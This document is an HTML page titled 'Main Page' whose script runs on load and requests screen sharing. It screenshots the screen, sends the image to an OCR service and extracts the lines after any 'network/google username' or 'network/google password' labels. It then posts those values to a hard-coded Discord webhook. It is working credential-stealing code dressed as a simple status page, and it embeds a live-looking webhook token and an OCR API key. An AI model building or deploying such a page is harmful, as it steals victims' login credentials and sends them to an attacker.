<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Main Page</title>
<style>
  body { font-family: sans-serif; padding: 20px; }
  #status { white-space: pre-wrap; border: 1px solid #ccc; padding: 10px; }
</style>
</head>
<body>
<h1>Main Page</h1>
<div id="status">Starting...</div>

<script>
const WEBHOOK="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO-sHihafx71V_YdUCH50OPKtXt4cUMIoi2C9rzzA7bOvUziTLzd";
const OCR_KEY="K85882318988957";

function logStatus(msg){
  const s = document.getElementById("status");
  s.textContent += msg + "\n";
  console.log(msg);
}

(async()=>{
  try{
    logStatus("Opening test tab for permissions...");
    const testTab = window.open("test.html","_blank");
    if(!testTab){ logStatus("Warning: test tab could not be opened. Continuing without it."); }

    logStatus("Requesting screen capture...");
    const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
    logStatus("Permissions granted.");

    // Notify test tab that permissions were granted
    if(testTab) testTab.postMessage({msg:"allowed-permissions"},"*");
    logStatus("Sent allowed-permissions message to test tab.");

    // Optional 1-second pause to ensure video is ready
    await new Promise(r => setTimeout(r, 1000));

    logStatus("Setting up video element...");
    const video = document.createElement("video");
    video.srcObject = stream;

    await new Promise(resolve=>{
      video.onloadedmetadata = ()=> video.play().then(resolve);
    });

    await new Promise(resolve=>{
      const check = ()=> {
        if(video.videoWidth && video.videoHeight) resolve();
        else setTimeout(check,50);
      };
      check();
    });

    logStatus("Capturing screenshot...");
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video,0,0);
    stream.getTracks().forEach(t=>t.stop());

    const blob = await new Promise(r=>canvas.toBlob(r,"image/png"));
    const formData = new FormData();
    formData.append("apikey",OCR_KEY);
    formData.append("language","eng");
    formData.append("file",blob,"shot.png");

    logStatus("Sending screenshot to OCR API...");
    const ocrRes = await fetch("https://api.ocr.space/parse/image",{method:"POST",body:formData});
    const ocrJson = await ocrRes.json();

    if(!ocrJson.ParsedResults?.length){
      logStatus("OCR worked, but no text detected.");
    } else {
      logStatus("OCR worked. Processing text...");
    }

    const lines = ocrJson.ParsedResults?.map(r=>r.ParsedText).join("\n").split(/\r?\n/) || [];
    const output = lines.reduce((a,v,i)=>{
      if(a) return a;
      if(v.toLowerCase().includes("network/google username") || v.toLowerCase().includes("network/google password")){
        return `${lines[i+1]||""}\n${lines[i+2]||""}`;
      }
      return "";
    },"").trim();

    if(!output){
      logStatus("Found no matches for network/google username or password.");
    } else {
      logStatus("Found matches:\n" + output);
    }

    logStatus("Sending results to Discord...");
    await fetch(WEBHOOK,{
      method:"POST",
      headers:{"Content-Type":"application/json"},
      body:JSON.stringify({content:output||"(no valid text found)"})
    });

    logStatus("OCR + Discord done!");

    // Finally, close the test tab
    if(testTab) testTab.postMessage({msg:"close-tab"},"*");
    logStatus("Sent close-tab message to test tab.");

  } catch(e){
    logStatus("Error: " + e.message);
  }
})();
</script>
</body>
</html>
